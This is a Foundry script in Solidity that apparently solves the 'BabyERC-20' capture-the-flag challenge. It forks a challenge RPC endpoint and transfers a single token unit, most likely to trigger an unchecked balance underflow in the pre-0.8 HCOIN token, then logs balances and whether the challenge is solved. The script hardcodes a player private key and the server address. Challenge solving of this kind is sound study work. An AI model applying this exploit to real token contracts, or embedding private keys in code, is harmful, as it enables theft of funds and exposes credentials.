// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import {console} from "forge-std/console.sol";
import {Script} from "forge-std/Script.sol";
import {Setup} from "../src/BabyERC-20/Setup.sol";
import {HCOIN} from "../src/BabyERC-20/HCOIN.sol";

contract SolveBabyERC is Script {
    uint256 playerPrivateKey;
    address player;

    Setup setupInstance;
    HCOIN hcoinInstance;

    function setUp() external {
        string memory rpcUrl = "http://45.32.119.201:13391/36c6dd78-00c5-470c-956b-139ccff87824";
        playerPrivateKey = 0x2e95bce86940b659debae7e80857bf1e92eb2b1b8e5c6c9feaac00a93251fe43;
        address setUpContract = 0x78fb4bcF652b5130f77A64A3Ea5489bE18b58B89;

        player = vm.addr(playerPrivateKey);
        vm.createSelectFork(rpcUrl);

        setupInstance = Setup(setUpContract);
        hcoinInstance = HCOIN(setupInstance.coin());
    }

    function run() external {
        vm.startBroadcast(playerPrivateKey);
        setupInstance.setPlayer(player);

        console.log("Before Player Balance: ", hcoinInstance.balanceOf(player) / 10**18);

        hcoinInstance.transfer(vm.addr(1), 1);

        console.log("After Player Balance: ", hcoinInstance.balanceOf(player) / 10**18);
        console.log("isSolved: ", setupInstance.isSolved());

        vm.stopBroadcast();
    }
}